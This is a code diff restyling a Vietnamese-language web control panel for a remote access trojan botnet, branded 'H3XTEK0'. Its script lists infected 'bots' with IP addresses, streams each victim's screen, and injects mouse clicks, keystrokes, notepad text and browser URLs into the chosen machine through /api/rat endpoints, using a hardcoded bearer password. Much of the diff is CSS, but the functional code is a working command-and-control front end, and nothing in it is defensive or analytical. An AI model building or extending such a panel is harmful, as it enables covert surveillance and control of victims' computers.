@@ -2,99 +2,471 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>RAT Control - H3XTEK0</title>
+    <link rel="stylesheet" href="/style.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #0a0a0f; color: #00ff88; font-family: 'Segoe UI', sans-serif; overflow: hidden; height: 100vh; }
-        .container { display: flex; height: 100vh; }
-        .sidebar { width: 260px; background: #1a1a2e; padding: 20px; border-right: 1px solid #00ff8855; overflow-y: auto; }
-        .main { flex: 1; display: flex; flex-direction: column; }
-        .screen-area { flex: 1; background: #0a0a0f; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; }
-        #screenCanvas { max-width: 100%; max-height: 100%; cursor: crosshair; image-rendering: auto; background: #0a0a0f; }
-        .controls { padding: 15px; background: #1a1a2e; border-top: 1px solid #00ff8855; display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
-        .controls input, .controls button { padding: 8px 15px; background: #0a0a0f; border: 1px solid #00ff8855; color: #00ff88; border-radius: 5px; }
-        .controls button { background: #00ff88; color: #0a0a0f; cursor: pointer; font-weight: bold; }
-        .controls button:hover { background: #00cc77; }
-        .controls button.danger { background: #ff0044; color: white; }
-        .controls button.danger:hover { background: #cc0033; }
-        .bot-list { margin-top: 20px; }
-        .bot-item { padding: 10px; margin: 5px 0; background: #0a0a0f; border-radius: 5px; cursor: pointer; border-left: 3px solid #ff4444; }
-        .bot-item.online { border-left-color: #00ff88; }
-        .bot-item:hover { background: #00ff8811; }
-        .bot-item.active { background: #00ff8822; border-left-color: #00ff88; }
-        .status-bar { padding: 5px 15px; background: #1a1a2e; border-bottom: 1px solid #00ff8855; font-size: 12px; color: #888; display: flex; justify-content: space-between; }
-        .status-bar span { color: #00ff88; }
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 999; }
-        .modal-content { position: relative; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #1a1a2e; padding: 30px; border-radius: 10px; max-width: 500px; }
-        .close { float: right; cursor: pointer; color: #ff4444; font-size: 24px; }
-        .coords-info { font-size: 10px; color: #666; }
+        /* ===== RAT SPECIFIC ===== */
+        .container-rat {
+            display: flex;
+            height: 100vh;
+            max-height: 100vh;
+            overflow: hidden;
+            background: var(--bg-dark);
+        }
+
+        /* SIDEBAR */
+        .sidebar {
+            width: 270px;
+            min-width: 200px;
+            padding: 20px 16px;
+            border-right: 1px solid var(--glass-border);
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            flex-shrink: 0;
+        }
+        .sidebar h2 {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 4px;
+            letter-spacing: 1px;
+        }
+        .sidebar .sub-info {
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-bottom: 12px;
+        }
+        .sidebar .sub-info span { color: var(--text-secondary); }
+        .sidebar .refresh-btn {
+            width: 100%;
+            padding: 8px;
+            background: rgba(255, 0, 51, 0.12);
+            border: 1px solid rgba(255, 0, 51, 0.2);
+            color: var(--text-secondary);
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 12px;
+            transition: all 0.3s;
+            margin-bottom: 12px;
+        }
+        .sidebar .refresh-btn:hover {
+            background: rgba(255, 0, 51, 0.2);
+            box-shadow: 0 0 20px var(--primary-glow);
+        }
+
+        /* BOT LIST */
+        .bot-list {
+            flex: 1;
+            overflow-y: auto;
+            margin: 4px 0 12px 0;
+        }
+        .bot-item {
+            padding: 10px 12px;
+            margin: 4px 0;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 8px;
+            cursor: pointer;
+            border-left: 3px solid #ff4444;
+            transition: all 0.25s ease;
+        }
+        .bot-item.online { border-left-color: var(--primary); }
+        .bot-item:hover {
+            background: rgba(255, 0, 51, 0.08);
+            transform: translateX(4px);
+        }
+        .bot-item.active {
+            background: rgba(255, 0, 51, 0.15);
+            border-left-color: var(--primary);
+            box-shadow: 0 0 20px rgba(255, 0, 51, 0.1);
+        }
+        .bot-item .name { font-weight: 600; font-size: 13px; }
+        .bot-item .ip { float: right; font-size: 11px; color: var(--text-muted); }
+        .bot-item .meta { font-size: 10px; color: var(--text-muted); margin-top: 2px; }
+
+        /* SIDEBAR QUICK ACTIONS */
+        .quick-actions {
+            border-top: 1px solid rgba(255, 0, 51, 0.1);
+            padding-top: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .quick-actions button {
+            width: 100%;
+            padding: 8px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            color: #ccc;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.3s;
+            text-align: left;
+        }
+        .quick-actions button:hover {
+            background: rgba(255, 0, 51, 0.1);
+            border-color: rgba(255, 0, 51, 0.2);
+            color: #fff;
+        }
+
+        /* MAIN AREA */
+        .main-rat {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            min-width: 0;
+        }
+
+        /* STATUS BAR */
+        .status-bar {
+            padding: 8px 16px;
+            background: rgba(20, 10, 15, 0.8);
+            border-bottom: 1px solid var(--glass-border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 4px 12px;
+            font-size: 12px;
+            color: var(--text-muted);
+            flex-shrink: 0;
+        }
+        .status-bar .bot-name { color: var(--text-secondary); font-weight: 600; }
+        .status-bar .status-text { color: #00ff88; }
+        .status-bar .fps { color: var(--text-secondary); }
+        .status-bar .coords { font-family: monospace; font-size: 11px; color: var(--text-muted); }
+
+        /* SCREEN AREA */
+        .screen-area {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #050505;
+            position: relative;
+            overflow: hidden;
+            min-height: 200px;
+        }
+        #screenCanvas {
+            max-width: 100%;
+            max-height: 100%;
+            cursor: crosshair;
+            background: #0a0a0f;
+            object-fit: contain;
+            display: block;
+        }
+        .placeholder-text {
+            position: absolute;
+            color: #444;
+            font-size: 16px;
+            text-align: center;
+            pointer-events: none;
+            user-select: none;
+            opacity: 0.6;
+        }
+        .placeholder-text span {
+            display: block;
+            font-size: 12px;
+            color: #666;
+            margin-top: 4px;
+        }
+
+        /* CONTROLS */
+        .controls {
+            padding: 10px 16px;
+            background: rgba(20, 10, 15, 0.8);
+            border-top: 1px solid var(--glass-border);
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            align-items: center;
+            flex-shrink: 0;
+        }
+        .controls input {
+            flex: 1;
+            min-width: 100px;
+            padding: 8px 12px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255, 0, 51, 0.15);
+            border-radius: 8px;
+            color: #fff;
+            font-size: 12px;
+        }
+        .controls input::placeholder { color: rgba(255,255,255,0.25); }
+        .controls input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 15px var(--primary-glow);
+        }
+        .controls button {
+            padding: 8px 14px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 12px;
+            transition: all 0.3s;
+            white-space: nowrap;
+        }
+        .controls .btn-ctrl {
+            background: rgba(255, 255, 255, 0.06);
+            color: #ccc;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+        }
+        .controls .btn-ctrl:hover {
+            background: rgba(255, 0, 51, 0.15);
+            border-color: var(--primary);
+            color: #fff;
+            box-shadow: 0 0 15px var(--primary-glow);
+        }
+        .controls .btn-ctrl.primary {
+            background: var(--primary);
+            color: #fff;
+            border-color: var(--primary);
+        }
+        .controls .btn-ctrl.primary:hover {
+            background: var(--primary-dark);
+            box-shadow: 0 0 25px var(--primary-glow);
+        }
+        .controls .btn-ctrl.danger {
+            background: rgba(255, 0, 68, 0.2);
+            color: #ff4444;
+            border-color: rgba(255, 0, 68, 0.2);
+        }
+        .controls .btn-ctrl.danger:hover {
+            background: rgba(255, 0, 68, 0.3);
+            box-shadow: 0 0 20px rgba(255, 0, 68, 0.2);
+        }
+
+        /* MODAL OVERRIDE */
+        .modal-content textarea {
+            width: 100%;
+            height: 140px;
+            background: rgba(0,0,0,0.5);
+            border: 1px solid rgba(255, 0, 51, 0.15);
+            border-radius: 8px;
+            color: #fff;
+            padding: 12px;
+            font-size: 13px;
+            resize: vertical;
+        }
+        .modal-content textarea:focus {
+            outline: none;
+            border-color: var(--primary);
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 900px) {
+            .sidebar {
+                width: 220px;
+                min-width: 160px;
+                padding: 12px;
+            }
+            .sidebar h2 { font-size: 15px; }
+        }
+
+        @media (max-width: 768px) {
+            .container-rat {
+                flex-direction: column;
+                height: 100vh;
+                overflow: hidden;
+            }
+            .sidebar {
+                width: 100%;
+                min-width: unset;
+                max-height: 180px;
+                border-right: none;
+                border-bottom: 1px solid var(--glass-border);
+                padding: 10px 12px;
+                flex-shrink: 0;
+                overflow-y: auto;
+            }
+            .sidebar h2 { font-size: 14px; }
+            .bot-list {
+                display: flex;
+                gap: 6px;
+                overflow-x: auto;
+                padding: 4px 0;
+                flex-wrap: nowrap;
+            }
+            .bot-item {
+                flex: 0 0 auto;
+                min-width: 120px;
+                padding: 6px 10px;
+                margin: 0;
+            }
+            .bot-item .ip { float: none; display: block; }
+            .quick-actions {
+                flex-direction: row;
+                flex-wrap: wrap;
+                border-top: none;
+                padding-top: 4px;
+                gap: 4px;
+            }
+            .quick-actions button {
+                flex: 1;
+                min-width: 60px;
+                padding: 4px 8px;
+                font-size: 10px;
+                text-align: center;
+            }
+            .controls {
+                padding: 6px 10px;
+                gap: 4px;
+            }
+            .controls input {
+                font-size: 11px;
+                padding: 6px 10px;
+                min-width: 60px;
+            }
+            .controls button {
+                font-size: 10px;
+                padding: 5px 10px;
+            }
+            .status-bar {
+                font-size: 10px;
+                padding: 4px 10px;
+            }
+            .screen-area {
+                min-height: 150px;
+            }
+            #screenCanvas {
+                width: 100% !important;
+                height: auto !important;
+            }
+            .placeholder-text {
+                font-size: 13px;
+            }
+            .modal-content {
+                margin: 10px !important;
+                padding: 16px !important;
+                max-width: 95% !important;
+            }
+            .modal-content textarea {
+                height: 100px;
+                font-size: 12px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .sidebar {
+                max-height: 150px;
+                padding: 6px 8px;
+            }
+            .sidebar h2 { font-size: 12px; }
+            .bot-item {
+                min-width: 80px;
+                padding: 4px 8px;
+                font-size: 10px;
+            }
+            .controls input {
+                font-size: 10px;
+                padding: 4px 8px;
+                min-width: 50px;
+            }
+            .controls button {
+                font-size: 9px;
+                padding: 4px 8px;
+            }
+            .status-bar {
+                font-size: 9px;
+                padding: 2px 8px;
+            }
+            .modal-content h3 { font-size: 14px; }
+        }
+
+        /* ===== SCROLLBAR TRIM ===== */
+        .bot-list::-webkit-scrollbar,
+        .sidebar::-webkit-scrollbar {
+            width: 4px;
+            height: 4px;
+        }
+        .bot-list::-webkit-scrollbar-thumb,
+        .sidebar::-webkit-scrollbar-thumb {
+            background: var(--primary);
+            border-radius: 10px;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="sidebar">
-            <h2>🎯 RAT Control</h2>
-            <div style="margin: 10px 0; font-size: 12px; color: #888;">
-                🔑 H3XTEK0 | <span id="botCount">0</span> bots online
-            </div>
-            <button onclick="refreshBots()" style="width:100%;padding:8px;background:#00ff88;color:#0a0a0f;border:none;border-radius:5px;cursor:pointer;">🔄 Refresh</button>
+    <div class="container-rat">
+        <!-- SIDEBAR -->
+        <div class="sidebar glass">
+            <h2>🎯 RAT</h2>
+            <div class="sub-info">🔑 H3XTEK0 · <span id="botCount">0</span> bots online</div>
+            <button class="refresh-btn" onclick="refreshBots()">🔄 Refresh</button>
+
             <div class="bot-list" id="botList">
-                <div style="color:#444;text-align:center;padding:20px;">Đang tải bot...</div>
+                <div style="color:#444;text-align:center;padding:16px;font-size:13px;">Đang tải bot...</div>
             </div>
-            <div style="margin-top:20px;border-top:1px solid #00ff8855;padding-top:15px;">
-                <button onclick="openNotepadModal()" style="width:100%;padding:8px;background:#444;color:white;border:none;border-radius:5px;cursor:pointer;">📝 Mở Notepad</button>
-                <button onclick="openBrowserModal()" style="width:100%;margin-top:5px;padding:8px;background:#444;color:white;border:none;border-radius:5px;cursor:pointer;">🌐 Mở Browser</button>
+
+            <div class="quick-actions">
+                <button onclick="openNotepadModal()">📝 Mở Notepad</button>
+                <button onclick="openBrowserModal()">🌐 Mở Browser</button>
             </div>
         </div>
-        <div class="main">
+
+        <!-- MAIN -->
+        <div class="main-rat">
+            <!-- STATUS BAR -->
             <div class="status-bar">
-                <span id="currentBot">Chưa chọn bot</span>
-                <span id="statusText">Idle</span>
-                <span id="fpsText">0 FPS</span>
-                <span id="debugCoords" class="coords-info">(0, 0)</span>
+                <span class="bot-name" id="currentBot">🔴 Chưa chọn bot</span>
+                <span class="status-text" id="statusText">Idle</span>
+                <span class="fps" id="fpsText">0 FPS</span>
+                <span class="coords" id="debugCoords">(0, 0)</span>
             </div>
+
+            <!-- SCREEN -->
             <div class="screen-area" id="screenArea">
                 <canvas id="screenCanvas"></canvas>
-                <div style="position:absolute;color:#444;font-size:14px;text-align:center;" id="placeholderText">
-                    Chọn bot để bắt đầu RAT<br>
-                    <span style="font-size:12px;color:#666;">Click vào ảnh để điều khiển chuột</span>
+                <div class="placeholder-text" id="placeholderText">
+                    🔴 Chọn bot để bắt đầu RAT
+                    <span>Click vào ảnh để điều khiển chuột</span>
                 </div>
             </div>
-            <div class="controls">
-                <input type="text" id="urlInput" placeholder="Nhập URL..." style="flex:1;min-width:150px;">
-                <button onclick="openBrowser()">🌐 Mở URL</button>
-                <input type="text" id="textInput" placeholder="Text để gõ..." style="flex:1;min-width:120px;">
-                <button onclick="sendKeyboard()">⌨️ Gõ</button>
-                <button onclick="sendClick('left')">🖱️ Click</button>
-                <button onclick="sendClick('right')">🖱️ Right</button>
-                <button onclick="sendClick('double')">🖱️ Double</button>
-                <button class="danger" onclick="stopRAT()">⏹️ Dừng</button>
+
+            <!-- CONTROLS -->
+            <div class="controls glass">
+                <input type="text" id="urlInput" class="input-glass" placeholder="URL..." style="flex:1;min-width:120px;">
+                <button class="btn-ctrl primary" onclick="openBrowser()">🌐 Mở</button>
+                <input type="text" id="textInput" class="input-glass" placeholder="Text..." style="flex:1;min-width:100px;">
+                <button class="btn-ctrl" onclick="sendKeyboard()">⌨️ Gõ</button>
+                <button class="btn-ctrl" onclick="sendClick('left')">🖱️ Click</button>
+                <button class="btn-ctrl" onclick="sendClick('right')">🖱️ Right</button>
+                <button class="btn-ctrl" onclick="sendClick('double')">🖱️ Double</button>
+                <button class="btn-ctrl danger" onclick="stopRAT()">⏹️ Dừng</button>
             </div>
         </div>
     </div>
 
-    <!-- Notepad Modal -->
+    <!-- NOTEPAD MODAL -->
     <div id="notepadModal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeNotepadModal()">&times;</span>
+        <div class="modal-content glass glow-red">
+            <span class="close" onclick="closeModal('notepadModal')">&times;</span>
             <h3>📝 Notepad Remote</h3>
-            <textarea id="notepadText" placeholder="Nhập text để ghi vào notepad..." style="width:100%;height:150px;background:#0a0a0f;color:#00ff88;border:1px solid #00ff8855;border-radius:5px;padding:10px;"></textarea>
-            <button onclick="sendNotepad()" style="background:#00ff88;color:#0a0a0f;border:none;padding:10px 20px;border-radius:5px;cursor:pointer;margin-top:10px;">Ghi vào Notepad</button>
+            <textarea id="notepadText" placeholder="Nhập text để ghi vào notepad..."></textarea>
+            <button onclick="sendNotepad()" class="btn btn-primary" style="margin-top:12px;width:100%;">📝 Ghi vào Notepad</button>
         </div>
     </div>
 
-    <!-- Browser Modal -->
+    <!-- BROWSER MODAL -->
     <div id="browserModal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeBrowserModal()">&times;</span>
+        <div class="modal-content glass glow-red">
+            <span class="close" onclick="closeModal('browserModal')">&times;</span>
             <h3>🌐 Mở Browser</h3>
-            <input type="text" id="browserUrlInput" placeholder="Nhập URL..." style="width:100%;padding:10px;background:#0a0a0f;color:#00ff88;border:1px solid #00ff8855;border-radius:5px;margin-top:10px;">
-            <button onclick="openBrowserFromModal()" style="background:#00ff88;color:#0a0a0f;border:none;padding:10px 20px;border-radius:5px;cursor:pointer;margin-top:10px;">🌐 Mở URL</button>
+            <input type="text" id="browserUrlInput" class="input-glass" placeholder="Nhập URL..." style="width:100%;margin-top:10px;">
+            <button onclick="openBrowserFromModal()" class="btn btn-primary" style="margin-top:12px;width:100%;">🌐 Mở URL</button>
         </div>
     </div>
 
     <script>
+        // ============================================================
+        //  RAT CONTROL - FULL SCRIPT
+        // ============================================================
+
         let currentBotId = null;
         let isStreaming = false;
         let streamInterval = null;
@@ -102,31 +474,46 @@
         let frameCount = 0;
         let botScreenWidth = 1920;
         let botScreenHeight = 1080;
+        let lastMoveTime = 0;
+
         const canvas = document.getElementById('screenCanvas');
         const ctx = canvas.getContext('2d');
         const API_PASSWORD = 'H3XTEK0';
-        
-        // Kích thước canvas cố định
-        const CANVAS_WIDTH = 900;
-        const CANVAS_HEIGHT = 600;
+
+        // Canvas fixed size (will be scaled by CSS)
+        const CANVAS_WIDTH = 960;
+        const CANVAS_HEIGHT = 640;
 
         function getAuth() {
             return { 'Authorization': `Bearer ${API_PASSWORD}` };
         }
 
-        // === TÍNH TOÁN TỌA ĐỘ CHÍNH XÁC ===
+        function closeModal(id) {
+            document.getElementById(id).classList.remove('active');
+            document.getElementById(id).style.display = 'none';
+        }
+
+        function openModal(id) {
+            const el = document.getElementById(id);
+            el.style.display = 'flex';
+            setTimeout(() => el.classList.add('active'), 10);
+        }
+
+        // ============================================================
+        //  TỌA ĐỘ CHÍNH XÁC - MAP TỪ CANVAS SANG MÀN HÌNH BOT
+        // ============================================================
         function getCanvasCoords(e) {
             const rect = canvas.getBoundingClientRect();
             
-            // Tọa độ trên canvas (pixel)
+            // Tọa độ trên canvas (pixel thực tế)
             let canvasX = (e.clientX - rect.left);
             let canvasY = (e.clientY - rect.top);
             
-            // Giới hạn trong canvas
+            // Giới hạn
             canvasX = Math.max(0, Math.min(rect.width, canvasX));
             canvasY = Math.max(0, Math.min(rect.height, canvasY));
             
-            // Tính tỷ lệ so với canvas logic
+            // Tỷ lệ giữa canvas logic và hiển thị
             const scaleX = canvas.width / rect.width;
             const scaleY = canvas.height / rect.height;
             
@@ -136,7 +523,7 @@
             x = Math.max(0, Math.min(canvas.width, x));
             y = Math.max(0, Math.min(canvas.height, y));
             
-            // Map sang màn hình bot
+            // MAP SANG MÀN HÌNH BOT
             const botX = Math.round((x / canvas.width) * botScreenWidth);
             const botY = Math.round((y / canvas.height) * botScreenHeight);
             
@@ -148,6 +535,9 @@
             };
         }
 
+        // ============================================================
+        //  BOT LIST
+        // ============================================================
         async function refreshBots() {
             try {
                 const res = await fetch('/api/bots/online', { headers: getAuth() });
@@ -163,7 +553,7 @@
             const list = document.getElementById('botList');
             list.innerHTML = '';
             if (bots.length === 0) {
-                list.innerHTML = '<div style="color:#444;text-align:center;padding:20px;">Không có bot online</div>';
+                list.innerHTML = '<div style="color:#444;text-align:center;padding:16px;">🔴 Không có bot online</div>';
                 return;
             }
             bots.forEach(b => {
@@ -171,19 +561,22 @@
                 div.className = 'bot-item online';
                 if (b.bot_id === currentBotId) div.classList.add('active');
                 div.innerHTML = `
-                    <strong>${b.bot_id.slice(0, 8)}...</strong>
-                    <span style="float:right;font-size:11px;color:#888;">${b.ip || 'Unknown'}</span>
-                    <div style="font-size:10px;color:#666;">${b.os} | v${b.version}</div>
+                    <span class="name">${b.bot_id.slice(0, 8)}...</span>
+                    <span class="ip">${b.ip || 'N/A'}</span>
+                    <div class="meta">${b.os || 'Unknown'} · v${b.version || '1.0'}</div>
                 `;
                 div.onclick = () => selectBot(b.bot_id);
                 list.appendChild(div);
             });
         }
 
+        // ============================================================
+        //  SELECT BOT
+        // ============================================================
         async function selectBot(botId) {
             if (currentBotId === botId) return;
             
-            // Lấy thông tin bot
+            // Lấy thông tin bot (kích thước màn hình)
             try {
                 const res = await fetch('/api/bots', { headers: getAuth() });
                 const bots = await res.json();
@@ -194,15 +587,15 @@
                     console.log(`[RAT] Bot screen: ${botScreenWidth}x${botScreenHeight}`);
                 }
             } catch(e) {}
-            
+
             if (isStreaming) stopStream();
-            
+
             currentBotId = botId;
             document.getElementById('currentBot').textContent = `🎯 ${botId.slice(0, 8)}...`;
             document.getElementById('placeholderText').style.display = 'block';
             document.getElementById('statusText').textContent = 'Connecting...';
             ctx.clearRect(0, 0, canvas.width, canvas.height);
-            
+
             try {
                 const res = await fetch('/api/rat/start', {
                     method: 'POST',
@@ -219,24 +612,26 @@
             } catch (e) {
                 alert('Lỗi kết nối RAT: ' + e.message);
             }
-            
+
             refreshBots();
         }
 
+        // ============================================================
+        //  STREAM
+        // ============================================================
         function startStream() {
             if (!currentBotId) return;
             isStreaming = true;
             document.getElementById('placeholderText').style.display = 'none';
             document.getElementById('statusText').textContent = 'Streaming...';
-            
+
             if (streamInterval) clearInterval(streamInterval);
-            
-            // Set canvas size
+
             canvas.width = CANVAS_WIDTH;
             canvas.height = CANVAS_HEIGHT;
-            
+
             fetch(`/api/rat/stream/${currentBotId}`, { headers: getAuth() });
-            
+
             streamInterval = setInterval(async () => {
                 if (!currentBotId) return;
                 try {
@@ -245,35 +640,28 @@
                     if (data && data.result && data.result.startsWith('data:image')) {
                         const img = new Image();
                         img.onload = function() {
-                            // Vẽ ảnh đúng tỷ lệ, giữ nguyên aspect ratio
+                            // Vẽ ảnh đúng tỷ lệ, giữ aspect ratio
                             const imgAspect = img.width / img.height;
                             const canvasAspect = canvas.width / canvas.height;
-                            
-                            let drawWidth, drawHeight, offsetX = 0, offsetY = 0;
-                            
+                            let dw, dh, ox = 0, oy = 0;
                             if (imgAspect > canvasAspect) {
-                                drawWidth = canvas.width;
-                                drawHeight = canvas.width / imgAspect;
-                                offsetY = (canvas.height - drawHeight) / 2;
+                                dw = canvas.width;
+                                dh = canvas.width / imgAspect;
+                                oy = (canvas.height - dh) / 2;
                             } else {
-                                drawHeight = canvas.height;
-                                drawWidth = canvas.height * imgAspect;
-                                offsetX = (canvas.width - drawWidth) / 2;
+                                dh = canvas.height;
+                                dw = canvas.height * imgAspect;
+                                ox = (canvas.width - dw) / 2;
                             }
-                            
                             ctx.clearRect(0, 0, canvas.width, canvas.height);
-                            ctx.drawImage(img, offsetX, offsetY, drawWidth, drawHeight);
+                            ctx.drawImage(img, ox, oy, dw, dh);
                             frameCount++;
                             document.getElementById('statusText').textContent = 'Streaming';
                         };
-                        img.onerror = function() {
-                            console.log('Lỗi tải ảnh');
-                        };
+                        img.onerror = function() { console.log('Lỗi tải ảnh'); };
                         img.src = data.result;
                     }
-                } catch (e) {
-                    console.error('Stream error:', e);
-                }
+                } catch (e) { console.error('Stream error:', e); }
             }, 500);
 
             setInterval(() => {
@@ -303,18 +691,39 @@
                 });
                 stopStream();
                 currentBotId = null;
-                document.getElementById('currentBot').textContent = 'Chưa chọn bot';
+                document.getElementById('currentBot').textContent = '🔴 Chưa chọn bot';
                 refreshBots();
             } catch (e) {
                 alert('Lỗi dừng RAT: ' + e.message);
             }
         }
 
-        // === XỬ LÝ CLICK ===
+        // ============================================================
+        //  MOUSE EVENTS
+        // ============================================================
+        async function sendMouseEvent(eventType, x, y) {
+            if (!currentBotId) return;
+            try {
+                await fetch('/api/rat/event', {
+                    method: 'POST',
+                    headers: { ...getAuth(), 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        bot_id: currentBotId,
+                        event_type: eventType,
+                        x: Math.round(x),
+                        y: Math.round(y)
+                    })
+                });
+            } catch (e) { console.error('Mouse event error:', e); }
+        }
+
+        // ============================================================
+        //  CANVAS EVENT LISTENERS
+        // ============================================================
         canvas.addEventListener('click', (e) => {
             if (!currentBotId || !isStreaming) return;
             const coords = getCanvasCoords(e);
-            console.log(`[RAT] Click at bot: (${coords.x}, ${coords.y})`);
+            console.log(`[RAT] Click: (${coords.x}, ${coords.y})`);
             document.getElementById('debugCoords').textContent = `(${coords.x}, ${coords.y})`;
             sendMouseEvent('click', coords.x, coords.y);
         });
@@ -332,44 +741,28 @@
             sendMouseEvent('rightclick', coords.x, coords.y);
         });
 
-        let lastMoveTime = 0;
         canvas.addEventListener('mousemove', (e) => {
             if (!currentBotId || !isStreaming) return;
             const now = Date.now();
             if (now - lastMoveTime < 50) return;
             lastMoveTime = now;
-            
             const coords = getCanvasCoords(e);
             document.getElementById('debugCoords').textContent = `(${coords.x}, ${coords.y})`;
             sendMouseEvent('move', coords.x, coords.y);
         });
 
-        async function sendMouseEvent(eventType, x, y) {
-            if (!currentBotId) return;
-            try {
-                await fetch('/api/rat/event', {
-                    method: 'POST',
-                    headers: { ...getAuth(), 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        bot_id: currentBotId,
-                        event_type: eventType,
-                        x: Math.round(x),
-                        y: Math.round(y)
-                    })
-                });
-            } catch (e) {
-                console.error('Mouse event error:', e);
-            }
-        }
-
+        // ============================================================
+        //  UI BUTTONS
+        // ============================================================
         async function sendClick(type) {
             if (!currentBotId) return;
+            const map = { 'left': 'click', 'right': 'rightclick', 'double': 'doubleclick' };
             await fetch('/api/rat/event', {
                 method: 'POST',
                 headers: { ...getAuth(), 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     bot_id: currentBotId,
-                    event_type: type === 'right' ? 'rightclick' : type === 'double' ? 'doubleclick' : 'click'
+                    event_type: map[type] || 'click'
                 })
             });
         }
@@ -404,13 +797,11 @@
             document.getElementById('urlInput').value = '';
         }
 
-        function openNotepadModal() {
-            document.getElementById('notepadModal').style.display = 'block';
-        }
-
-        function closeNotepadModal() {
-            document.getElementById('notepadModal').style.display = 'none';
-        }
+        // ============================================================
+        //  NOTEPAD
+        // ============================================================
+        function openNotepadModal() { openModal('notepadModal'); }
+        function closeNotepadModal() { closeModal('notepadModal'); }
 
         async function sendNotepad() {
             const text = document.getElementById('notepadText').value.trim();
@@ -429,13 +820,11 @@
             alert('✅ Đã gửi text đến notepad!');
         }
 
-        function openBrowserModal() {
-            document.getElementById('browserModal').style.display = 'block';
-        }
-
-        function closeBrowserModal() {
-            document.getElementById('browserModal').style.display = 'none';
-        }
+        // ============================================================
+        //  BROWSER MODAL
+        // ============================================================
+        function openBrowserModal() { openModal('browserModal'); }
+        function closeBrowserModal() { closeModal('browserModal'); }
 
         async function openBrowserFromModal() {
             const url = document.getElementById('browserUrlInput').value.trim() || 'https://www.google.com';
@@ -453,9 +842,21 @@
             closeBrowserModal();
         }
 
-        // Auto refresh
+        // ============================================================
+        //  AUTO REFRESH
+        // ============================================================
         setInterval(refreshBots, 10000);
         refreshBots();
+
+        // Click outside modal to close
+        document.querySelectorAll('.modal').forEach(m => {
+            m.addEventListener('click', (e) => {
+                if (e.target === m) {
+                    m.classList.remove('active');
+                    m.style.display = 'none';
+                }
+            });
+        });
     </script>
 </body>
 </html>
